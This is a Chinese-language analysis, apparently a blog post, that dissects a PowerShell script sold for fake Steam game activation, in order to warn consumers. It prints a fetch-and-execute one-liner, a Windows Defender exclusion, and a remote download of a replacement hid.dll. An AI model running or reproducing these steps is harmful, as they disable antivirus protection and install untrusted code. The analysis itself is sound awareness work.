# 关于steam假入库的脚本分析

## 1.写在前面

**不推荐任何人,以任何理由,任何方式来运行和使用这些脚本,仅限科普使用!!**

由于逛电商平台时看见好多极高销量的假入库商家,就浅浅研究了一下商家提供的假入库的脚本,具体内容如下

技术水平有限,如有理解不到位的地方请指出

## 2.命令分析

一般情况下,假入库商家会提供一个代码让你运行

```powershell
irm steam.work|iex
```

解析:从链接`steam.work`下载脚本文件并直接执行

通过以下代码可以将脚本不运行下载到本地

```powershell
irm steam.work | Out-File -FilePath "D:\temp\stwork\sw.ps1"
```

下载内容即为库中的`sw.ps1`(不要自己去运行下载的脚本!)

## 3.简单概述

该脚本就是通过替换与删除steam文件来实现虚假入库的操作

## 4.脚本分析

#### 无风险部分

第一行:

```powershell
cls
```

清空powerShell屏幕



第2~22行:

```powershell
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue
```

打印一个蓝色的steam艺术字



#### 风险部分

第24~31行

```powershell
$filePathToDelete = Join-Path $env:USERPROFILE "a.ps1"
 if (Test-Path $filePathToDelete) {
    Remove-Item -Path $filePathToDelete
}
$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "a.ps1"
if (Test-Path $desktopFilePathToDelete) {
    Remove-Item -Path $desktopFilePathToDelete
}
```

获取用户文件夹与桌面文件夹是否存在`a.ps1`文件,如有则删除该文件

分析:也许是怕个别用户的电脑会保存此脚本文件而暴露?



第33~40行

```powershell
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$localPath = -join ($env:LOCALAPPDATA,"\Steam")
if ((Test-Path $steamRegPath)) {
    $properties = Get-ItemProperty -Path $steamRegPath
    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
        $steamPath = $properties.SteamPath
    }
}
```

从Windows注册表中获取steam安装路径,并获取`C:\Users\<用户名>\AppData\Local`下的`\Steam`目录



第42~46行

```powershell
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+ivt+mHjeaWsOaJk+W8gFBvd2VyIHNoZWxsIOaJk+W8gOaWueW8j+S7peeuoeeQhuWRmOi6q+S7vei/kOihjF0="))
    Write-Host "$TextShow" -ForegroundColor:red
    return;
}
```

检查用户是否为管理员运行此脚本,若非管理员运行,则输出红色提示`[请重新打开Power shell 打开方式以管理员身份运行]`并自动结束脚本

分析:为后续操作获取更高的权限,脚本作者甚至采取了Base64编码来防止直接提示阅读内容



第49~52行

```powershell
    if ($steamPath -eq ""){
        Write-Host "[请检查您的Steam是否正确安装]" -ForegroundColor:Red
        return;
    }
```

检查是否有安装steam,若未安装,则输出红色提示`[请检查您的Steam是否正确安装]`并结束脚本



第54~56行

```powershell
    Write-Host "[ServerStart        OK]" -ForegroundColor:green
    Stop-Process -Name steam* -Force -ErrorAction Stop
    Start-Sleep 2
```

输出绿色提示`[ServerStart        OK]`告知用户脚本运行成功

尝试停止steam相关进程并等待2秒



第57~60行

```powershell
    if(Get-Process steam* -ErrorAction Stop){
        TASKKILL /F /IM "steam.exe" | Out-Null
        Start-Sleep 2
    }
```

再次检测是否有steam进程残留,如有则通过系统命令`TASKKILL`强制终止进程



第62~67行

```powershell
    if (!(Test-Path $localPath)) {
        md $localPath | Out-Null
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force | Out-Null
        }
    }
```

检查`C:\Users\<用户名>\AppData\Local\Steam`是否存在,若不存在则使用`mkdir`尝试创建

创建后再次检测,若依旧不存在,则使用`New-Item`再次创建

分析:两次创建都使用`Out-Null`抑制日志输出防止用户发现?



第69~74行

```powershell
    try{
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        Start-Sleep 3
    }catch{}

    Write-Host "[Result->0          OK]" -ForegroundColor:green
```

将steam路径添加至`Windows Defender`白名单中**(极高危操作!)**

输出绿色提示`[Result->0          OK]`告知用户进度

分析:防止`Windows Defender`误杀后续的文件,但是对添加白名单失败没做任何处理



第76~99行

```powershell
    try{
        $d = $steamPath + "/version.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/user32.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/steam.cfg"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/hid.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        
        $d = $steamPath + "/hid"
    }catch{
        $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+W8guW4uOaui+eVmeivt+aMieeFp+i3r+W+hOWIoOmZpOaWh+S7tl0tPg=="))
        Write-Host "$TextShow[$d]" -ForegroundColor:red
        return;
    }
```

尝试删除steam目录下的`version.dll` `user32.dll` `steam.cfg` `hid.dll`文件,若删除失败则输出红色提示`[异常残留请按照路径删除文件]->`与对应路径要求用户主动删除,并结束脚本

分析:依旧采取了`Out-Null`与Base64编码来抑制日志输出与防止直接阅读输出内容



第101~112行

```powershell
    $downApi = "http://1.steam.work/api/integral/pwsDownFile"
    
    irm -Uri $downApi -Headers @{ Referer = "libary" } -OutFile $d -ErrorAction Stop
    $newFilePath = [System.IO.Path]::ChangeExtension($d, ".dll")
    Rename-Item -Path $d -NewName $newFilePath
    
    Write-Host "[Result->1          OK]" -ForegroundColor:green
    $d = $localPath + "/localData.vdf"
    irm -Uri $downApi -Headers @{ Referer = "localData.vdf" } -OutFile $d -ErrorAction Stop
    Write-Host "[Result->2          OK]" -ForegroundColor:green
    
    Start-Sleep 1
```

通过不同的请求头来向链接请求不同的文件,在stema路径中下载第一个文件后为其添加`.dll`后缀并输出绿色成功信息,随后下载第二个文件并输出绿色成功信息,最终下载的文件即为仓库中的`hid.dll` `localData.vdf`**(高危操作!)**

最后等待1秒

分析:从云端下载特别制作的steam破解文件,来实现绕过G胖验证机制激活游戏的功能,可能含有病毒

`hid.dll`的请求头说不定还是拼错的`libary`?`library`?

> `hid.dll`是微软Windows操作系统中管理HID（人机接口设备）(也就是键鼠类的设备)的动态链接库文件,默认优先使用软件自带的文件,若软件没有该文件,则使用Windows默认的文件
>
> 如果该文件遭到特殊篡改,可能导致的后果包括但不限于`应用程序无法启动`、`输入设备失效`、`系统蓝屏等异常`



第114行

```powershell
    Start steam://
```

启动steam,没什么好说的



第116~119行

```powershell
    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+i/nuaOpeacjeWZqOaIkOWKn+WcqFN0ZWFt5YWl5r+A5rS7IDPnp5LlkI7oh6pd"))
    Write-Host "$TextShow" -ForegroundColor:green
    
    Start-Sleep 3
```

输出绿色提示`[连接服器成功在Steam入激活 3秒后自]`并等待3秒

分析:依旧是Base64编码,但是这个解码结果确实不像是句子



第121~123行

```powershell
    $processID = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
    
    Stop-Process -Id $processID.ParentProcessId -Force
    
    exit
```

获取当前运行窗口的父进程并使用`Stop-Process`强制终止

使用`exit`退出脚本

## 5.写在最后

希望能看到的人能识别假入库和了解假入库的风险(虽然知道看到的应该都知道风险,不知道风险的看不到)

能劝一个是一个吧

本文可以随意转载,如果您愿意带上原链接那就更好了,严禁用于商业用途但是允许通过科普内容获取平台激励等
